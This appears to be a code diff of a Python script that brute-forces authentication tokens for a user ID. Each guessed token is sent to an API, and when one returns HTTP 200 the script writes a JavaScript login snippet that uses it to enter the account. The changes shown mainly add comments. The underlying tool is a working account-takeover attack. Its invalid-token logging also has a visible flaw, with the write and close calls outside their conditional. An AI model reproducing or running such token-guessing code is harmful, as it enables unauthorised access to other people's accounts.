@@ -49,10 +49,10 @@ def request(encodedUserID):
             continue  # Skip already checked tokens
 
         header = headerToken(token)
-        response = requests.get(apiURL, headers=header)
+        response = requests.get(apiURL, headers=header) # sends the api request 
 
         print(f"\n\nTrying token: {token}\n")
-        checkedList.append(token)
+        checkedList.append(token) # Add the generated token to a checked list
 
         if response.status_code == 200: # Token is valid
             print(f"\n\n\nValid Token Found: {token}")
@@ -68,22 +68,23 @@ def request(encodedUserID):
             f.write("}, 2500);\n")
             f.write("}\n")
             f.write(f"login ('{token}')")
-            isTokenValid = True
+            f.close()
+            isTokenValid = True # Changes the boolean value to true only if the token is found and the program ends
         elif response.status_code == 401: # Token is invalid
             print(f"Token: {token} Invalid !")
             tokenInvalid.append(token) # If you don´t want to store invalid tokens in a list just comment this line
-            if writeInvalidToken==True:
+            if writeInvalidToken==True: # Only writes to file if you want
                 f=open(".\\tokenFiles\\invalidTokens.txt", "a", encoding="utf-8")
             f.write(token+"\n")
             f.close()
         else:
-            print(f"Unexpected Error: {response.status_code} - {response.text}")
+            print(f"Unexpected Error: {response.status_code} - {response.text}") #If any response other than 200 or 401
 
 
 def main(): #Main Function
     """Main function that calls other functions"""
-    if not os.path.exists(".\\tokenFiles\\"):
-        os.mkdir(".\\tokenFiles\\")
+    if not os.path.exists(".\\tokenFiles\\"): 
+        os.mkdir(".\\tokenFiles\\") # Creates folder if it does not exist
     f=open(".\\tokenFiles\\invalidTokens.txt", "w", encoding="utf-8") # If you want the program to save previous tokens, comment this and the next line
     f.close()
     encodedUserID = encodeUserID(userID)
